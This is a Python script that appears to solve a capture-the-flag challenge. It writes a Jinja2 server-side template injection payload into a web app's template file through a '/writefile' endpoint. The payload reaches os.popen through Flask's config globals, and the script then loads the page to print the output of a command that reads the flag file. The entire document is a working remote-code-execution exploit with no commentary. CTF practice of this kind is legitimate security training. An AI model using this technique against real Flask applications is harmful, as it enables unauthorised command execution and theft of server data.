import requests

TARGET = "http://10.249.14.223:32787/"


def solve():
  cmd = "cat /home/ctf/flag.txt"
  ssti_payload = (
    "{% set output = config.__class__.__init__.__globals__['os'].popen('"
    + cmd
    + "').read() %}{{ output }}"
  )
  write_url = f"{TARGET}/writefile"
  params = {"filename": "templates/index.html.html"}

  try:
    r = requests.post(write_url, params=params, data=ssti_payload)
    assert r.status_code == 200
  except Exception as e:
    print(f"[-] Failed: {e}")
    return

  try:
    r = requests.get(f"{TARGET}/")
    print("-" * 20)
    print(r.text.strip())
  except Exception as e:
    print(f"[-] Failed: {e}")


if __name__ == "__main__":
  solve()
